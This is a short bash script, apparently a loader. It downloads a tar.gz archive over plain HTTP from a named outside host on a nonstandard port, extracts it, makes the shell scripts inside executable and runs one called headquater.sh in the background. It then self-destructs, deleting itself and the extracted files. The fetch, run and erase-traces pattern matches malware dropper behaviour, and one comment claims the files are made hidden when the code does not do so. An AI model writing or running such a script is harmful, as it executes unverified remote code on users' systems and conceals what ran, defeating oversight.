#!/bin/bash

# Function to remove the script file
self_destruct() {
    cd ..
    echo $PWD
    rm "index.sh"
    rm -rf $(basename "$temp_dir")
}

# Function to wait for the script to finish
wait_for_script() {
    echo "Waiting for script to finish..."
    wait $!
    echo "Script finished."
}

# URL of the tar.gz file to download
url="http://vyapar.vaisworks.com:32774/master-script.tar.gz"

# Temporary directory to extract files
temp_dir=$(mktemp -d)

# Download the tar.gz file and extract it
curl -s "$url" | tar -xz -C "$temp_dir" --strip-components=1

# Make the extracted directory hidden
mv "$temp_dir" "$(basename "$temp_dir")"

# Run a script inside the extracted directory
cd "$(basename "$temp_dir")" || exit
chmod u+x *.sh
./headquater.sh &

# Wait for the script to finish
wait_for_script

# Self-destruct
self_destruct